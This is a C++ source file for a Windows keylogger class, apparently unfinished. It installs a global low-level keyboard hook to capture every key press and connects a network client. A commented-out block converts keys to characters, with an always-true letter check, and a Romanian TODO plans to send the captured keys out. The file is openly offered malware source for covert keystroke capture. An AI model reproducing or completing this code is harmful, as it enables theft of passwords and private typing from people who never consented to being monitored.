#include "keylogger.h"


keylogger::keylogger()
    : hook(SetWindowsHookExA(WH_KEYBOARD_LL, &keylogger::LowLevelKeyboardProc, NULL, 0)),
    client(&validation_function)
{
}

keylogger::~keylogger()
{
    if (hook != NULL)
        UnhookWindowsHookEx(hook);
    client.Disconnect();
}

LRESULT CALLBACK keylogger::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    static bool caps;
    
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kbdStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        DWORD virtualKeyCode = kbdStruct->vkCode;
        DWORD scanCode = kbdStruct->scanCode;
        

        /*if (virtualKeyCode != VK_CAPITAL)
        {
            WORD asciiCode;
            BYTE keyboardState[256] = { 0 };
            GetKeyboardState(keyboardState);
            
            if (ToAscii(virtualKeyCode, scanCode, keyboardState, &asciiCode, 0) != 0) {
                if (asciiCode >= 'A' || asciiCode <= 'Z')
                {
                    asciiCode += (caps ? 32 : 0);
                }
                std::cout << "S a tastat: " << char(asciiCode) << " Virtual code: " << virtualKeyCode << "\n";
            }
            else
            {
                std::cout << "Nu s a putut convertii vk! " << virtualKeyCode << "\n";
            }
        }*/
    }

 // TODO: Trimitem virtualKey ul si cu state pentru downkey si togglekey
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
